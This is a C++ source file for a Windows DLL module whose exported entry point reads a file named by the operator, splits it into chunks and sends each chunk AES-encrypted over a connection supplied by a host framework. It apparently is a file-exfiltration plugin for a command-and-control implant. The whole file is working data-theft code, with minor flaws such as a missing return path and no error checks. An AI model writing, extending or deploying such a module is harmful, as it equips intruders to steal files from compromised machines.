#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <structs.h>
#include <Filter.h>

ULONG GetFile(PUCHAR &dataBlob, LPCSTR filePath)
{
    BOOL bErrorFlag = FALSE;
    DWORD dwBytesReaded = 0;
    HANDLE hFile = NULL;

    hFile = CreateFileA(filePath,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);


    ULONG dataSz = GetFileSize(hFile, 0);

    dataBlob = new unsigned char[dataSz];

    bErrorFlag = ReadFile(
        hFile,
        dataBlob,
        dataSz,
        &dwBytesReaded,
        NULL);

    CloseHandle(hFile);

    return dataSz;
}

static inline ULONG part_count(ULONG buffer_size) {
    int a = 0;
    for (int i = 0; i < buffer_size; i += 4094)
    {
        a++;
    }
    return a;
}

std::vector<FILEPART> split_file(PUCHAR buffer, int size) {
    std::vector<FILEPART> array;
    int offset = 0;
    int _size = size;

    for (int i = 0; i < part_count(size); i++)
    {   
        char buf[256];

        FILEPART fp;
        if (_size - 4094 >= 0)
        {
            memcpy(fp.file_part, buffer + offset, 4094);
            fp.part_length = 4094;
            array.push_back(fp);
            _size -= 4094;
            offset += 4094;
        }
        else
        {
            memcpy(fp.file_part, buffer + offset, _size);
            fp.part_length = _size;
            array.push_back(fp);
            return array;
        }
    }
}

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	FILEINFO response = { 0 };
    PUCHAR file_buf;
    ULONG file_size = GetFile(file_buf, ctx.argv.at(0).c_str());
    response.file_size = file_size;
    response.part_count = part_count(file_size);

	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));

    auto pt_array = split_file(file_buf, file_size);
    for (int i = 0; i < part_count(file_size); i++)
    {
        ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&pt_array.at(i), 4096);
    }
	return 0;
}